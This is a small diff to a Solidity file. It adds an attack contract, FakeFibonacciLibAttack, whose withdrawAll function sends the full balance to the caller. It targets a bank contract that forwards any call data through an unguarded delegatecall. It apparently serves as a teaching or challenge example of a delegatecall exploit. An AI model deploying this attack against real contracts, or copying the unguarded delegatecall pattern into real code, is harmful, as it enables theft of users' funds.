@@ -44,3 +44,9 @@ contract FakeFibonacciBank {
     require(fakeFibonacciLibrary.delegatecall(msg.data));
   }
 }
+
+contract FakeFibonacciLibAttack {
+  function withdrawAll() {
+    msg.sender.transfer(address(this).balance);
+  }
+}
